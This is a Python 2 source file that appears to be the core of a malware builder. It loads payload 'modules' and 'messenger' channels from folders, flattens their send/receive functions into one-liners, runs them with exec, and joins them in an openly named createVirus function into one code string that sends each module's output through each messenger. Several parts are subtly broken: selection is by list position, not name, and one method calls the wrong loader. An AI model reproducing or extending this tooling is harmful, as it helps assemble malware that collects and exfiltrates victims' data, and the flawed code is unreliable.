import re, os, sys, ast, random
import astunparse
from onelinerizer import onelinerize

try: 
    import terminaltables
except:
    print "Oops"
ignoreFiles = [".DS_Store", "__init__.py", "config.py"]
ignoreEnds = ["pyc"]
supportedOS = ["Windows", "Darwin", "*"]


class utils():
    @staticmethod
    def checkFile(fileLines, sender = False):
        _regex = "__%s__.*?=.*?\"(.*?)\""
        _sys = re.compile(_regex % "sys")
        _name = re.compile(_regex % "name")
        _desc = re.compile(_regex % "desc")
        resultTemp = {
            "success": 0,
            "info": "None",
            "sys": "",
            "name": "",
            "desc": "",
            "sendCode": "",
            "sendCodeFunc": ""
        }
        for i in enumerate(fileLines):
            if ";" not in i[1]:
                if not resultTemp["sys"]:
                    lineSys = _sys.findall(i[1])
                    if lineSys:
                        resultTemp["sys"] = lineSys[0]
                        continue
                if not resultTemp["name"]:
                    lineName = _name.findall(i[1])
                    if lineName:
                        resultTemp["name"] = lineName[0]
                        continue
                if not resultTemp["desc"]:
                    lineDesc = _desc.findall(i[1])
                    if lineDesc:
                        resultTemp["desc"] = lineDesc[0]
                        continue
            else:
                trivialResult = utils.checkFile(i[1].split(";"))
                for j in trivialResult:
                    if not resultTemp[j] and trivialResult[j]:
                        resultTemp[j] = trivialResult[j]
        return resultTemp

    @staticmethod
    def checkContent(info, file):
        if info["sys"] not in supportedOS:
            info["success"] = 1
            info["info"] = "OS not Supported"
            print "[!] OS not Supported for file %s" % file
        for k in info:
            if not info[k] and k in ["sys", "name", "desc"]:
                info["success"] = 2
                info["info"] = k
                print "[!] No %s has been given in file %s" % (info["info"], 
                    file)
        if " " in info["name"]:
            info["success"] = 3
            info["info"] = "Space In Name"
            print "[!] There should be no space in name of %s" % file
        return info

    @staticmethod
    def checkModuleInt(info, file):
        try:
            code = open(file).read()
            for i in ast.walk(ast.parse(code)):
                try:
                    if isinstance(i, ast.FunctionDef):
                        funcCode = astunparse.unparse(i)
                        reSendFunc = re.compile("def.+?send\(")
                        if reSendFunc.findall(funcCode):
                            funcName = 'send%s%s' % (
                                info["name"], str(random.randint(0,2000)))
                            sendCode = onelinerize(reSendFunc.sub('def %s(' % funcName,
                                funcCode))
                            exec(sendCode)
                            info["sendCode"] = sendCode
                            info["sendCodeFunc"] = funcName

                except:
                    info["success"] = 4
                    info["info"] = "Error"
                    print "[x] Error %s in file %s" % (sys.exc_info()[0], file)

            if info["sendCode"] == "":
                info["success"] = 5
                info["info"] = "No Send Func"
                print "[!] No 'send' function in file %s" % file
        except:
            info["success"] = 4
            info["info"] = "Error"
            print "[x] Error %s in file %s" % (sys.exc_info()[0], file)
        return info

    @staticmethod
    def checkModule(info, file):
        return utils.checkContent(
            utils.checkModuleInt(info, file), 
            file)

    @staticmethod
    def checkSendInt(info, file):
        try:
            code = open(file).read()
            for i in ast.walk(ast.parse(code)):
                try:
                    if isinstance(i, ast.FunctionDef):
                        funcCode = astunparse.unparse(i)
                        reSendFunc = re.compile("def.+?send\(")
                        reReceiveFunc = re.compile("def.+?receive\(")
                        if reSendFunc.findall(funcCode):
                            funcName = 'send%s%s' % (
                                info["name"], str(random.randint(0,2000)))
                            sendCode = onelinerize(reSendFunc.sub('def %s(' % funcName,
                                funcCode))
                            exec(sendCode)
                            info["sendCode"] = sendCode
                            info["sendCodeFunc"] = funcName
                        elif reReceiveFunc.findall(funcCode):
                            funcName = 'receive%s%s' % (
                                info["name"], str(random.randint(0,2000)))
                            receiveCode = onelinerize(reReceiveFunc.sub('def %s(' % funcName,
                                funcCode))
                            exec(receiveCode)
                            info["receiveCode"] = receiveCode
                            info["receiveCodeFunc"] = funcName
                except:
                    info["success"] = 4
                    info["info"] = "Error"
                    print "[x] Error %s in file %s" % (sys.exc_info()[0], file)

            if info["sendCode"] == "":
                info["success"] = 5
                info["info"] = "No Send Func"
                print "[!] No 'send' function in file %s" % file

            if info["receiveCode"] == "":
                info["success"] = 5
                info["info"] = "No Receive Func"
                print "[!] No 'receive' function in file %s" % file
        except:
            info["success"] = 4
            info["info"] = "Error"
            print "[x] Error %s in file %s" % (sys.exc_info()[0], file)
        return info

    @staticmethod
    def checkSend(info, file):
        return utils.checkContent(
            utils.checkSendInt(info, file), 
            file)

    @staticmethod
    def checkAva(module, info):
        moduleNames = [x["name"] for x in info]
        if module in moduleNames:
            for i in info:
                if i["name"] == module:
                    if i["success"] == 0:
                        return True
                    else:
                        print "[!] Module %s is not available, ignored" % module
                        return False
        print "[!] Module %s is not available, ignored" % module
        return False


class API():
    @staticmethod
    def getModuleInfo(path='module'):
        moduleInfo = []
        for dirpath,dirnames,filenames in os.walk(path):
            for file in filenames:
                fullpath = os.path.join(dirpath,file)
                if not (file in ignoreFiles \
                    or file.split(".")[-1] in ignoreEnds):
                    moduleInfo.append(utils.checkModule(
                        utils.checkFile(
                            open(fullpath).readlines()
                        ),fullpath
                    ))
        return moduleInfo

    @staticmethod
    def getSendInfo(path='messenger'):
        sendInfo = []
        for dirpath,dirnames,filenames in os.walk(path):
            for file in filenames:
                fullpath = os.path.join(dirpath,file)
                if not (file in ignoreFiles \
                    or file.split(".")[-1] in ignoreEnds):
                        sendInfo.append(utils.checkSend(
                            utils.checkFile(
                                open(fullpath).readlines()
                            ),fullpath
                        ))
        return sendInfo

    @staticmethod
    def createVirus(moduleList, sendList, path = None, 
        sendPath = 'messenger',
        modulePath = "module"):
        moduleInfo = API.getModuleInfo(modulePath)
        sendInfo = API.getSendInfo(sendPath)
        realModuleList = []
        realSendList = []
        for send in enumerate(sendList):
            if utils.checkAva(send[1], sendInfo):
                realSendList.append(sendInfo[send[0]])

        for module in enumerate(moduleList):
            if utils.checkAva(module[1], moduleInfo):
                realModuleList.append(moduleInfo[module[0]])
        moduleCode = ""
        sendCode = ""
        execCode = ""
        for realModule in realModuleList:
            moduleCode += "%s;" % (realModule["sendCode"])
        for realSend in realSendList:
            sendCode += "%s;" % (realSend["sendCode"])
        for i in moduleInfo:
            for j in sendInfo:
                execCode += "%s(%s(), '%s');" % (
                    j["sendCodeFunc"], i["sendCodeFunc"], 
                    i["name"])

        return moduleCode + sendCode + execCode


class beautify():
    @staticmethod
    def b(info):
        result = [["Name", "Description", "SupportedOS", "Status"]]
        for i in info:
            if i["success"] == 0:
                result.append([i["name"], i["desc"], i["sys"], "OK"])
            else:
                result.append(
                    [i["name"], i["desc"], i["sys"], "Failed"]
                )
        try:
            return terminaltables.AsciiTable(result).table
        except:
            print "Error! Did you install terminaltables"
    
    @staticmethod
    def getModuleInfo(path='module'):
        info = API.getModuleInfo(path)
        return beautify.b(info)

    @staticmethod
    def getSendInfo(path='messenger'):
        info = API.getModuleInfo(path)
        return beautify.b(info)
